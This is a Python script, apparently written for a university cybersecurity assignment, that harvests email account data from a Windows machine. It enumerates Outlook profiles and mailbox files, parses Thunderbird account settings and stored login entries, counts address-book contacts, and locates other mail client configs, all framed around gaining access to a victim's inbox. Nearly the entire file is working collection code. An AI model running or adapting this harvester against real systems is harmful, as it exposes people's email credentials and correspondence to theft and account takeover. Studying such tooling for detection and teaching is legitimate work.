"""
Email Credential & Profile Harvester
MITRE ATT&CK: T1087.003 (Account Discovery: Email Account)
               T1114.001 (Email Collection: Local Email Collection)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Extracts email account information from locally installed email clients:
  - Microsoft Outlook profiles (Registry)
  - Mozilla Thunderbird profiles (profiles.ini + logins.json)
  - Windows Mail / Mail app
  - Generic email config files (.muttrc, .fetchmailrc, etc.)

Why this matters:
  - Email credentials = access to victim's inbox
  - Email = primary password reset vector (controls other accounts)
  - Corporate email = access to internal communications
  - Outlook profiles contain SMTP/IMAP server info + cached creds
  - Thunderbird stores passwords in logins.json (encrypted, but extractable)
"""

import os
import json
import sqlite3
import configparser
from datetime import datetime

try:
    import winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False


def harvest_outlook_profiles():
    """
    Extract Outlook email profiles from Windows Registry.

    Outlook stores profile data under:
      HKCU\\Software\\Microsoft\\Office\\<version>\\Outlook\\Profiles

    Returns:
        list of dicts with profile info

    MITRE ATT&CK: T1087.003
    """
    if not HAS_WINREG:
        return []

    profiles = []

    # Check common Office versions
    office_versions = ["16.0", "15.0", "14.0", "12.0"]

    for version in office_versions:
        try:
            profiles_key = f"Software\\Microsoft\\Office\\{version}\\Outlook\\Profiles"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, profiles_key, 0, winreg.KEY_READ)

            i = 0
            while True:
                try:
                    profile_name = winreg.EnumKey(key, i)
                    profiles.append({
                        "client": "Outlook",
                        "version": version,
                        "profile_name": profile_name,
                        "source": "registry",
                    })
                    i += 1
                except OSError:
                    break

            winreg.CloseKey(key)
        except Exception:
            continue

    # Check default profile
    try:
        default_key = "Software\\Microsoft\\Office\\16.0\\Outlook"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, default_key, 0, winreg.KEY_READ)
        try:
            default_profile, _ = winreg.QueryValueEx(key, "DefaultProfile")
            for p in profiles:
                if p["profile_name"] == default_profile:
                    p["is_default"] = True
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass

    # Check for Outlook data files (.ost, .pst)
    outlook_data_dirs = [
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Outlook"),
        os.path.join(os.environ.get("USERPROFILE", ""), "Documents", "Outlook Files"),
    ]

    for data_dir in outlook_data_dirs:
        if not os.path.exists(data_dir):
            continue
        try:
            for fname in os.listdir(data_dir):
                ext = os.path.splitext(fname)[1].lower()
                if ext in [".ost", ".pst"]:
                    full_path = os.path.join(data_dir, fname)
                    profiles.append({
                        "client": "Outlook",
                        "type": "data_file",
                        "filename": fname,
                        "path": full_path,
                        "size_mb": round(os.path.getsize(full_path) / (1024 * 1024), 1),
                        "format": ext[1:].upper(),
                        "source": "filesystem",
                    })
        except Exception:
            continue

    return profiles


def harvest_thunderbird_profiles():
    """
    Extract Thunderbird email profiles and stored credentials.

    Thunderbird stores:
    - profiles.ini in %APPDATA%/Thunderbird/
    - logins.json in each profile directory (encrypted passwords)
    - prefs.js contains server/account configuration

    Returns:
        list of dicts with profile/credential info

    MITRE ATT&CK: T1087.003, T1114.001
    """
    profiles = []
    tb_dir = os.path.join(os.environ.get("APPDATA", ""), "Thunderbird")

    if not os.path.exists(tb_dir):
        return profiles

    profiles_ini = os.path.join(tb_dir, "profiles.ini")
    if not os.path.exists(profiles_ini):
        return profiles

    config = configparser.ConfigParser()
    try:
        config.read(profiles_ini)
    except Exception:
        return profiles

    for section in config.sections():
        if not section.startswith("Profile"):
            continue

        try:
            name = config.get(section, "Name", fallback="Unknown")
            path = config.get(section, "Path", fallback="")
            is_relative = config.getboolean(section, "IsRelative", fallback=True)
            is_default = config.getboolean(section, "Default", fallback=False)

            if is_relative:
                profile_path = os.path.join(tb_dir, path)
            else:
                profile_path = path

            if not os.path.exists(profile_path):
                continue

            profile_data = {
                "client": "Thunderbird",
                "profile_name": name,
                "profile_path": profile_path,
                "is_default": is_default,
                "source": "profiles.ini",
                "accounts": [],
                "stored_logins": [],
            }

            # Extract account info from prefs.js
            prefs_path = os.path.join(profile_path, "prefs.js")
            if os.path.exists(prefs_path):
                accounts = _parse_thunderbird_prefs(prefs_path)
                profile_data["accounts"] = accounts

            # Check for stored logins (logins.json)
            logins_path = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, "r") as f:
                        logins_data = json.load(f)

                    for login in logins_data.get("logins", []):
                        profile_data["stored_logins"].append({
                            "hostname": login.get("hostname", ""),
                            "username": login.get("encryptedUsername", "")[:30] + "...",
                            "password_encrypted": True,
                            "times_used": login.get("timesUsed", 0),
                            "last_used": login.get("timeLastUsed", ""),
                        })
                except Exception:
                    pass

            # Check for address book
            abook_path = os.path.join(profile_path, "abook.sqlite")
            if os.path.exists(abook_path):
                try:
                    conn = sqlite3.connect(abook_path)
                    cursor = conn.execute("SELECT COUNT(*) FROM cards")
                    count = cursor.fetchone()[0]
                    profile_data["address_book_contacts"] = count
                    conn.close()
                except Exception:
                    pass

            profiles.append(profile_data)

        except Exception:
            continue

    return profiles


def _parse_thunderbird_prefs(prefs_path):
    """Parse Thunderbird prefs.js for email account configuration."""
    accounts = {}

    try:
        with open(prefs_path, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line.startswith("user_pref("):
                    continue

                try:
                    inner = line[10:-2]
                    key, _, value = inner.partition(", ")
                    key = key.strip('"')
                    value = value.strip('"')
                except Exception:
                    continue

                if "mail.server." in key:
                    parts = key.split(".")
                    if len(parts) >= 4:
                        server_id = parts[2]
                        prop = parts[3]

                        if server_id not in accounts:
                            accounts[server_id] = {"server_id": server_id}

                        if prop == "hostname":
                            accounts[server_id]["server"] = value
                        elif prop == "type":
                            accounts[server_id]["type"] = value
                        elif prop == "userName":
                            accounts[server_id]["username"] = value
                        elif prop == "port":
                            accounts[server_id]["port"] = value
                        elif prop == "socketType":
                            socket_map = {"0": "plain", "2": "STARTTLS", "3": "SSL/TLS"}
                            accounts[server_id]["encryption"] = socket_map.get(value, value)

                elif "mail.smtpserver." in key:
                    parts = key.split(".")
                    if len(parts) >= 4:
                        smtp_id = parts[2]
                        prop = parts[3]
                        smtp_key = f"smtp_{smtp_id}"

                        if smtp_key not in accounts:
                            accounts[smtp_key] = {"server_id": smtp_key, "type": "smtp"}

                        if prop == "hostname":
                            accounts[smtp_key]["server"] = value
                        elif prop == "username":
                            accounts[smtp_key]["username"] = value
                        elif prop == "port":
                            accounts[smtp_key]["port"] = value

                elif "mail.identity." in key:
                    parts = key.split(".")
                    if len(parts) >= 4:
                        id_name = parts[2]
                        prop = parts[3]
                        id_key = f"identity_{id_name}"

                        if id_key not in accounts:
                            accounts[id_key] = {"server_id": id_key, "type": "identity"}

                        if prop == "useremail":
                            accounts[id_key]["email"] = value
                        elif prop == "fullName":
                            accounts[id_key]["full_name"] = value

    except Exception:
        pass

    return list(accounts.values())


def harvest_generic_email_configs():
    """Look for generic email configuration files."""
    configs = []
    home = os.environ.get("USERPROFILE", "")

    email_config_files = [
        ".muttrc", ".neomutt/neomuttrc",
        ".fetchmailrc", ".msmtprc",
        ".mbsyncrc", ".offlineimaprc",
        ".notmuch-config",
    ]

    for config_name in email_config_files:
        config_path = os.path.join(home, config_name)
        if os.path.exists(config_path):
            try:
                size = os.path.getsize(config_path)
                configs.append({
                    "client": os.path.basename(config_name).replace(".", "").replace("rc", ""),
                    "path": config_path,
                    "size_bytes": size,
                    "source": "config_file",
                })
            except Exception:
                continue

    return configs


def harvest_windows_mail():
    """Check for Windows Mail / Mail app account data."""
    accounts = []

    mail_dir = os.path.join(
        os.environ.get("LOCALAPPDATA", ""),
        "Comms", "Unistore", "data"
    )

    if os.path.exists(mail_dir):
        try:
            total_size = 0
            for root, dirs, files in os.walk(mail_dir):
                for f in files:
                    total_size += os.path.getsize(os.path.join(root, f))

            if total_size > 0:
                accounts.append({
                    "client": "Windows Mail",
                    "path": mail_dir,
                    "data_size_mb": round(total_size / (1024 * 1024), 1),
                    "source": "local_store",
                })
        except Exception:
            pass

    return accounts


def full_email_harvest():
    """
    Complete email credential and profile harvest across all clients.

    Returns:
        dict with all email account data
    """
    outlook = harvest_outlook_profiles()
    thunderbird = harvest_thunderbird_profiles()
    generic = harvest_generic_email_configs()
    win_mail = harvest_windows_mail()

    all_accounts = outlook + thunderbird + generic + win_mail

    emails_found = set()
    for a in all_accounts:
        if a.get("email"):
            emails_found.add(a["email"])
        for acc in a.get("accounts", []):
            if acc.get("email"):
                emails_found.add(acc["email"])

    return {
        "timestamp": datetime.now().isoformat(),
        "outlook_profiles": outlook,
        "thunderbird_profiles": thunderbird,
        "generic_configs": generic,
        "windows_mail": win_mail,
        "summary": {
            "total_profiles": len(all_accounts),
            "outlook_count": len(outlook),
            "thunderbird_count": len(thunderbird),
            "generic_count": len(generic),
            "windows_mail_count": len(win_mail),
            "unique_emails_found": len(emails_found),
            "emails": list(emails_found),
        },
    }


if __name__ == "__main__":
    print("=" * 50)
    print("  Email Credential Harvester Test")
    print("  MITRE ATT&CK: T1087.003, T1114.001")
    print("=" * 50)

    print("\n[*] Scanning for Outlook profiles...")
    outlook = harvest_outlook_profiles()
    print(f"[+] Outlook: {len(outlook)} items found")
    for o in outlook:
        if o.get("profile_name"):
            default = " (DEFAULT)" if o.get("is_default") else ""
            print(f"    Profile: {o['profile_name']}{default}")
        elif o.get("filename"):
            print(f"    Data file: {o['filename']} ({o.get('size_mb', '?')} MB)")

    print("\n[*] Scanning for Thunderbird profiles...")
    thunderbird = harvest_thunderbird_profiles()
    print(f"[+] Thunderbird: {len(thunderbird)} profiles found")
    for t in thunderbird:
        default = " (DEFAULT)" if t.get("is_default") else ""
        print(f"    Profile: {t['profile_name']}{default}")

    print("\n[*] Scanning for generic email configs...")
    generic = harvest_generic_email_configs()
    print(f"[+] Generic: {len(generic)} config files found")

    print("\n[*] Checking Windows Mail...")
    win_mail = harvest_windows_mail()
    print(f"[+] Windows Mail: {len(win_mail)} stores found")
